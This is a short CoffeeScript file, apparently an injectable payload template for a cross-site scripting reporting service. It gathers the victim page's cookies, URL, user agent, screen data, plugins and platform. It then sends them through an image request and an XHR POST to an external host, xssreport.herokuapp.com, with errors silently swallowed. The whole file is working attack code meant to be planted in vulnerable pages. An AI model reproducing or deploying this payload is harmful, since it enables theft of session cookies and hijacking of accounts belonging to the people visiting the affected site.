getURL = ->
  (if 'https:' == document.location.protocol then 'https://' else 'http://') + "xssreport.herokuapp.com/r/<%= uri %>/"

# cookie
d = ''
try
  d += 'c=' + encodeURIComponent(document.cookie)
catch e;

# url
try
  d += '&u=' + encodeURIComponent(window.location.href)
catch e;

# send important first
try
  i = new Image()
  i.src = getURL() + "?" + d
catch e;

# useragent 
try
  ua = encodeURIComponent(navigator.userAgent)
  d += '&ua=' + ua
catch e;

# screen
s = ''
try
  for k, v of screen
    s += k + ':' + v + ';'
  d += '&s=' + encodeURIComponent(s)
catch e;

# plugins, platform
a = 'Plugins:'
try
  for p in navigator.plugins
    a += (p.name || '') + ', '
  a += '; Platform:' + navigator.platform + ';'
  d += '&a=' + encodeURIComponent(a)
catch e;

try
  xmlhttp = if window.XMLHttpRequest then new XMLHttpRequest() else new ActiveXObject("Microsoft.XMLHTTP")
  xmlhttp.open("POST", getURL(), true)
  xmlhttp.send(d)
catch e;
